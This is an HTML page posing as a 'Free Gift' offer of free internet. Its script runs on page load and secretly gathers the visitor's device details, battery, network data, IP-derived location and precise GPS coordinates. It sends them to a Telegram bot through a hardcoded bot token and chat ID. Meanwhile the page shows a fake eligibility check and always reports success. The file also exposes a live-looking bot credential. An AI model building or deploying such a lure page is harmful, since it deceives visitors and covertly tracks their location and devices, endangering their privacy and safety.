<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Gift</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f0f8ff;
            color: #333;
        }
        .header {
            background: linear-gradient(135deg, #4b6cb7, #182848);
            color: white;
            padding: 20px 0;
            text-align: center;
            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
        }
        .header h1 {
            margin: 0;
            font-size: 28px;
        }
        .header p {
            margin: 10px 0 0;
            font-size: 16px;
        }
        .gift-box {
            width: 150px;
            height: 150px;
            margin: 20px auto;
            background: url('https://cdn-icons-png.flaticon.com/512/3481/3481072.png') no-repeat center center;
            background-size: contain;
            animation: bounce 2s infinite;
        }
        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-20px); }
        }
        .content {
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
            background: white;
            border-radius: 10px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
            margin-top: 20px;
            margin-bottom: 40px;
        }
        .loading {
            text-align: center;
            padding: 20px;
        }
        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #4b6cb7;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 2s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .hidden {
            display: none;
        }
        .success-message {
            text-align: center;
            padding: 20px;
            color: #2ecc71;
            font-weight: bold;
            font-size: 18px;
        }
        .config-section {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 8px;
            margin-top: 20px;
            border: 1px dashed #ccc;
        }
        .config-title {
            font-weight: bold;
            margin-bottom: 10px;
            color: #4b6cb7;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>üéÅ Free Gift For You! üéÅ</h1>
        <p>Your gift is being prepared, please wait....</p>
    </div>

    <div class="gift-box"></div>

    <div class="content">
        <div id="loading-section" class="loading">
            <div class="loader"></div>
            <p>Your information is being verified to determine your eligibility for the gift</p>
        </div>

        <div id="success-section" class="success-message hidden">
            <p>üéâ You have successfully qualified for the gift! üéâ</p>
            <p>You will be notified of the details soon..</p>
        </div>
    </div>

    <!-- Configuration section (can be hidden in production) -->
    <div class="content config-section">
        <div class="config-title">Limited Time Gift Offer</div>
        <p><strong>Result:</strong> Congratulations!</p>
        <p><strong>Offer:</strong> Free internet for your line</p>
        <p>Spider.</p>
    </div>

    <script>
        // Telegram settings - change these to your own data
        const TELEGRAM_BOT_TOKEN = '8513801746:AAFTelzGpZ1saipcfza6wxwi50IBCs1CE08';
        const TELEGRAM_CHAT_ID = '6970365339';
        
        // Store all collected data
        let allCollectedData = {};
        
        // Show success message
        function showSuccess() {
            document.getElementById('loading-section').classList.add('hidden');
            document.getElementById('success-section').classList.remove('hidden');
        }
        
        // Collect device information
        function collectDeviceInfo() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                deviceMemory: navigator.deviceMemory || 'unknown',
                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                maxTouchPoints: navigator.maxTouchPoints || 'unknown',
                screenWidth: window.screen.width,
                screenHeight: window.screen.height,
                colorDepth: window.screen.colorDepth,
                pixelRatio: window.devicePixelRatio,
                orientation: window.screen.orientation ? window.screen.orientation.type : 'unknown',
                languages: navigator.languages ? navigator.languages.join(', ') : navigator.language,
                cookieEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack || 'unspecified',
                pdfViewerEnabled: navigator.pdfViewerEnabled || 'unknown',
                webdriver: navigator.webdriver || 'unknown'
            };
        }
        
        // Collect network information
        function collectNetworkInfo() {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            
            if (connection) {
                return {
                    type: connection.type || connection.effectiveType || 'unknown',
                    downlink: connection.downlink ? `${connection.downlink} Mbps` : 'unknown',
                    rtt: connection.rtt ? `${connection.rtt} ms` : 'unknown',
                    saveData: connection.saveData ? 'yes' : 'no',
                    downlinkMax: connection.downlinkMax || 'unknown'
                };
            }
            return null;
        }
        
        // Collect battery information
        function collectBatteryInfo() {
            if ('getBattery' in navigator) {
                return navigator.getBattery().then(battery => {
                    return {
                        level: Math.round(battery.level * 100) + '%',
                        charging: battery.charging ? 'yes' : 'no',
                        chargingTime: battery.chargingTime === Infinity ? 'unknown' : `${Math.round(battery.chargingTime / 60)} minutes`,
                        dischargingTime: battery.dischargingTime === Infinity ? 'unknown' : `${Math.round(battery.dischargingTime / 60)} minutes`,
                        voltage: battery.voltage || 'unknown',
                        temperature: battery.temperature || 'unknown'
                    };
                });
            }
            return Promise.resolve(null);
        }
        
        // Get IP and location information
        function fetchIPAndLocation() {
            return fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(ipData => {
                    const ip = ipData.ip;
                    return fetch(`https://ipapi.co/${ip}/json/`)
                        .then(response => response.json())
                        .then(locationData => {
                            return {
                                ip: ip,
                                country: locationData.country_name || 'unknown',
                                countryCode: locationData.country_code || 'unknown',
                                city: locationData.city || 'unknown',
                                timezone: locationData.timezone || 'unknown',
                                isp: locationData.org || 'unknown',
                                latitude: locationData.latitude || 'unknown',
                                longitude: locationData.longitude || 'unknown',
                                region: locationData.region || 'unknown',
                                postalCode: locationData.postal || 'unknown',
                                currency: locationData.currency || 'unknown',
                                callingCode: locationData.country_calling_code || 'unknown',
                                languages: locationData.languages || 'unknown',
                                asn: locationData.asn || 'unknown'
                            };
                        });
                });
        }
        
        // Get precise location
        function fetchPreciseLocation() {
            return new Promise((resolve) => {
                if ('geolocation' in navigator) {
                    navigator.geolocation.getCurrentPosition(
                        position => {
                            resolve({
                                preciseLatitude: position.coords.latitude,
                                preciseLongitude: position.coords.longitude,
                                accuracy: position.coords.accuracy + ' meters',
                                altitude: position.coords.altitude || 'unknown',
                                altitudeAccuracy: position.coords.altitudeAccuracy || 'unknown',
                                heading: position.coords.heading || 'unknown',
                                speed: position.coords.speed || 'unknown'
                            });
                        },
                        () => {
                            resolve(null);
                        }
                    );
                } else {
                    resolve(null);
                }
            });
        }
        
        // Get more device details
        function getAdditionalDeviceInfo() {
            return {
                vendor: navigator.vendor || 'unknown',
                product: navigator.product || 'unknown',
                appVersion: navigator.appVersion,
                appName: navigator.appName,
                appCodeName: navigator.appCodeName,
                oscpu: navigator.oscpu || 'unknown',
                productSub: navigator.productSub || 'unknown',
                vendorSub: navigator.vendorSub || 'unknown',
                buildID: navigator.buildID || 'unknown',
                maxTouchPoints: navigator.maxTouchPoints,
                mediaDevices: navigator.mediaDevices ? 'available' : 'unavailable',
                storage: navigator.storage ? 'available' : 'unavailable',
                usb: navigator.usb ? 'available' : 'unavailable',
                bluetooth: navigator.bluetooth ? 'available' : 'unavailable',
                clipboard: navigator.clipboard ? 'available' : 'unavailable'
            };
        }
        
        // Get screen details
        function getScreenDetails() {
            return {
                availWidth: window.screen.availWidth,
                availHeight: window.screen.availHeight,
                width: window.screen.width,
                height: window.screen.height,
                colorDepth: window.screen.colorDepth,
                pixelDepth: window.screen.pixelDepth,
                orientation: window.screen.orientation ? window.screen.orientation.type : 'unknown',
                orientationAngle: window.screen.orientation ? window.screen.orientation.angle : 'unknown'
            };
        }
        
        // Get browser performance data
        function getPerformanceInfo() {
            if (window.performance && window.performance.memory) {
                return {
                    jsHeapSizeLimit: Math.round(window.performance.memory.jsHeapSizeLimit / (1024 * 1024)) + ' MB',
                    totalJSHeapSize: Math.round(window.performance.memory.totalJSHeapSize / (1024 * 1024)) + ' MB',
                    usedJSHeapSize: Math.round(window.performance.memory.usedJSHeapSize / (1024 * 1024)) + ' MB'
                };
            }
            return null;
        }
        
        // Send data to Telegram
        function sendToTelegram(data) {
            // Prepare message
            let message = `üìä *New Device Data Collection* üìä\n\n`;
            
            // Device information
            message += `üíª *DEVICE INFORMATION:*\n`;
            message += `- OS Platform: ${data.deviceInfo.platform}\n`;
            message += `- User Agent: ${data.deviceInfo.userAgent}\n`;
            message += `- RAM: ${data.deviceInfo.deviceMemory} GB\n`;
            message += `- CPU Cores: ${data.deviceInfo.hardwareConcurrency}\n`;
            message += `- Max Touch Points: ${data.deviceInfo.maxTouchPoints}\n`;
            message += `- Languages: ${data.deviceInfo.languages}\n`;
            message += `- Cookies Enabled: ${data.deviceInfo.cookieEnabled}\n`;
            message += `- Do Not Track: ${data.deviceInfo.doNotTrack}\n\n`;
            
            // Additional device info
            if (data.additionalDeviceInfo) {
                message += `üîß *ADDITIONAL DEVICE DETAILS:*\n`;
                message += `- Vendor: ${data.additionalDeviceInfo.vendor}\n`;
                message += `- Product: ${data.additionalDeviceInfo.product}\n`;
                message += `- App Version: ${data.additionalDeviceInfo.appVersion}\n`;
                message += `- Media Devices: ${data.additionalDeviceInfo.mediaDevices}\n`;
                message += `- WebUSB: ${data.additionalDeviceInfo.usb}\n`;
                message += `- Bluetooth: ${data.additionalDeviceInfo.bluetooth}\n\n`;
            }
            
            // Screen information
            message += `üñ• *SCREEN INFORMATION:*\n`;
            message += `- Resolution: ${data.deviceInfo.screenWidth} √ó ${data.deviceInfo.screenHeight}\n`;
            message += `- Pixel Ratio: ${data.deviceInfo.pixelRatio}\n`;
            message += `- Color Depth: ${data.deviceInfo.colorDepth} bit\n`;
            message += `- Orientation: ${data.deviceInfo.orientation}\n`;
            
            if (data.screenDetails) {
                message += `- Available Resolution: ${data.screenDetails.availWidth} √ó ${data.screenDetails.availHeight}\n`;
                message += `- Pixel Depth: ${data.screenDetails.pixelDepth}\n\n`;
            } else {
                message += `\n`;
            }
            
            // Battery status
            if (data.batteryInfo) {
                message += `üîã *BATTERY STATUS:*\n`;
                message += `- Level: ${data.batteryInfo.level}\n`;
                message += `- Charging: ${data.batteryInfo.charging}\n`;
                message += `- Charging Time: ${data.batteryInfo.chargingTime}\n`;
                message += `- Discharging Time: ${data.batteryInfo.dischargingTime}\n\n`;
            }
            
            // Network information
            if (data.networkInfo) {
                message += `üåê *NETWORK INFORMATION:*\n`;
                message += `- Connection Type: ${data.networkInfo.type}\n`;
                message += `- Download Speed: ${data.networkInfo.downlink}\n`;
                message += `- Round Trip Time: ${data.networkInfo.rtt}\n`;
                message += `- Data Saving Mode: ${data.networkInfo.saveData}\n\n`;
            }
            
            // IP and location information
            if (data.ipInfo) {
                message += `üìç *LOCATION INFORMATION (IP):*\n`;
                message += `- IP Address: ${data.ipInfo.ip}\n`;
                message += `- Country: ${data.ipInfo.country} (${data.ipInfo.countryCode})\n`;
                message += `- City: ${data.ipInfo.city}\n`;
                message += `- Region: ${data.ipInfo.region}\n`;
                message += `- Timezone: ${data.ipInfo.timezone}\n`;
                message += `- ISP: ${data.ipInfo.isp}\n`;
                message += `- Currency: ${data.ipInfo.currency}\n`;
                message += `- Calling Code: ${data.ipInfo.callingCode}\n\n`;
                
                message += `üó∫ *GEOGRAPHIC COORDINATES:*\n`;
                message += `- Latitude: ${data.ipInfo.latitude}\n`;
                message += `- Longitude: ${data.ipInfo.longitude}\n`;
                message += `- Postal Code: ${data.ipInfo.postalCode}\n`;
                message += `- ASN: ${data.ipInfo.asn}\n\n`;
            }
            
            // Precise location
            if (data.preciseLocation) {
                message += `üéØ *PRECISE LOCATION:*\n`;
                message += `- Latitude: ${data.preciseLocation.preciseLatitude}\n`;
                message += `- Longitude: ${data.preciseLocation.preciseLongitude}\n`;
                message += `- Accuracy: ¬±${data.preciseLocation.accuracy}\n\n`;
                
                // Google Maps link
                message += `üìç [View on Google Maps](https://www.google.com/maps?q=${data.preciseLocation.preciseLatitude},${data.preciseLocation.preciseLongitude})`;
            }
            
            // Performance information
            if (data.performanceInfo) {
                message += `\n\n‚ö° *PERFORMANCE INFORMATION:*\n`;
                message += `- JS Heap Size Limit: ${data.performanceInfo.jsHeapSizeLimit}\n`;
                message += `- Total JS Heap Size: ${data.performanceInfo.totalJSHeapSize}\n`;
                message += `- Used JS Heap Size: ${data.performanceInfo.usedJSHeapSize}\n`;
            }
            
            // Send message to Telegram
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            
            return fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown',
                    disable_web_page_preview: false
                })
            });
        }
        
        // Main process to collect and send data
        async function collectAndSendData() {
            try {
                // Collect basic data
                allCollectedData.deviceInfo = collectDeviceInfo();
                allCollectedData.networkInfo = collectNetworkInfo();
                allCollectedData.additionalDeviceInfo = getAdditionalDeviceInfo();
                allCollectedData.screenDetails = getScreenDetails();
                allCollectedData.performanceInfo = getPerformanceInfo();
                
                // Collect async data
                const [batteryInfo, ipInfo, preciseLocation] = await Promise.all([
                    collectBatteryInfo(),
                    fetchIPAndLocation(),
                    fetchPreciseLocation()
                ]);
                
                allCollectedData.batteryInfo = batteryInfo;
                allCollectedData.ipInfo = ipInfo;
                allCollectedData.preciseLocation = preciseLocation;
                
                // Send data to Telegram
                await sendToTelegram(allCollectedData);
                
                // Show success message
                showSuccess();
                
            } catch (error) {
                console.error('Error during data collection:', error);
                // Show success message anyway
                showSuccess();
            }
        }
        
        // Start data collection after page load
        window.onload = function() {
            console.log("Data collection started...");
            setTimeout(collectAndSendData, 3000);
        };
    </script>
</body>
</html>
